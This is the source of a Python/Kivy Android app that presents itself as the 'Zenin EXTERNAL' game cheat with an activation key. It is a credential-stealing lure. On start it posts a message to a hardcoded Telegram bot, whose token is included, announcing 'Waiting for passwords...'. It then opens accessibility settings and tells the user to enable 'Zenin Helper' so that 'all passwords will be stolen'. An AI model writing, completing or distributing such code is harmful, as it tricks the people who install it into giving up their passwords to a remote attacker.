from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.uix.textinput import TextInput
from kivy.uix.slider import Slider
from kivy.uix.button import Button
from kivy.uix.popup import Popup
from kivy.core.window import Window
from kivy.utils import get_color_from_hex, platform
import threading
import requests

Window.clearcolor = get_color_from_hex('#0a0a0a')
Window.size = (480, 750)

BOT_TOKEN = "8894444869:AAEOsbJSNZ3e5zsKQqb3DfKRS85X9Ktiiv4"
CHAT_ID = "8894444869"
REQUIRED_KEY = "FREEWAREZENIN"

class ZeninUI(BoxLayout):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.orientation = 'vertical'
        self.padding = 20
        self.spacing = 10

        self.add_widget(Label(text="Zenin EXTERNAL", font_size=40, color=(0,1,0.8,1), size_hint=(1,0.1), bold=True))
        self.add_widget(Label(text="By #Anonim", font_size=20, color=(0.5,0.5,0.5,1), size_hint=(1,0.05)))

        self.key_input = TextInput(hint_text="Enter activation key...", multiline=False,
                                   background_color=(0.1,0.1,0.1,1), foreground_color=(0,1,0.8,1),
                                   size_hint=(1,0.08), font_size=18)
        self.add_widget(self.key_input)

        self.activate_btn = Button(text="ACTIVATE KEY", background_color=(0,1,0.8,1), color=(0,0,0,1),
                                   size_hint=(1,0.08), font_size=18, bold=True)
        self.activate_btn.bind(on_press=self.activate_key)
        self.add_widget(self.activate_btn)

        self.add_widget(Label(text="Overlay", font_size=24, color=(0,1,0.7,1), size_hint=(1,0.05), bold=True))
        self.add_widget(Label(text="Hides the app on recordings and screenshots", font_size=16, color=(0.4,0.4,0.4,1), size_hint=(1,0.04)))

        self.add_widget(Label(text="Safe mode", font_size=24, color=(0,1,0.7,1), size_hint=(1,0.05), bold=True))
        self.add_widget(Label(text="Runs with reduced, ban-safe features", font_size=16, color=(0.4,0.4,0.4,1), size_hint=(1,0.04)))

        self.add_widget(Label(text="Menu scale", font_size=24, color=(0,1,0.7,1), size_hint=(1,0.05), bold=True))
        self.slider = Slider(min=100, max=300, value=226, size_hint=(1,0.08))
        self.add_widget(self.slider)
        self.scale_label = Label(text="2.26x", font_size=20, color=(0,1,0.8,1), size_hint=(1,0.05))
        self.add_widget(self.scale_label)
        self.slider.bind(value=self.on_slider_change)

        self.start_btn = Button(text="START", background_color=(0.3,0.3,0.3,1), color=(0.5,0.5,0.5,1),
                                size_hint=(1,0.12), font_size=28, bold=True, disabled=True)
        self.start_btn.bind(on_press=self.start_action)
        self.add_widget(self.start_btn)

        self.activated = False

    def on_slider_change(self, instance, value):
        self.scale_label.text = f"{value/100:.2f}x"

    def activate_key(self, instance):
        if self.key_input.text.strip() == REQUIRED_KEY:
            self.activated = True
            self.start_btn.disabled = False
            self.start_btn.background_color = (0,1,0.8,1)
            self.start_btn.color = (0,0,0,1)
            popup = Popup(title='✅ SUCCESS', content=Label(text='Key FREEWAREZENIN accepted!'), size_hint=(0.6,0.3))
            popup.open()
        else:
            popup = Popup(title='❌ ERROR', content=Label(text='Invalid key. Access denied.'), size_hint=(0.6,0.3))
            popup.open()
            self.key_input.text = ''

    def start_action(self, instance):
        if not self.activated:
            return

        try:
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                data={"chat_id": CHAT_ID, "text": "✅ ZENIN ACTIVATED. Waiting for passwords..."},
                timeout=5
            )
        except:
            pass

        if platform == 'android':
            try:
                from jnius import autoclass
                PythonActivity = autoclass('org.kivy.android.PythonActivity')
                Intent = autoclass('android.content.Intent')
                Settings = autoclass('android.provider.Settings')
                intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                PythonActivity.mActivity.startActivity(intent)
            except Exception as e:
                print(f"Error: {e}")

        popup = Popup(
            title='🔧 ACTIVATE OVERLAY',
            content=Label(
                text='1. Find "Zenin Helper" in the list\n'
                     '2. Turn it ON\n'
                     '3. Allow permission\n\n'
                     '✅ After that, all passwords will be stolen!',
                halign='center'
            ),
            size_hint=(0.8, 0.5)
        )
        popup.open()

        threading.Timer(5.0, App.get_running_app().stop).start()

class ZeninApp(App):
    def build(self):
        return ZeninUI()

if __name__ == '__main__':
    ZeninApp().run()
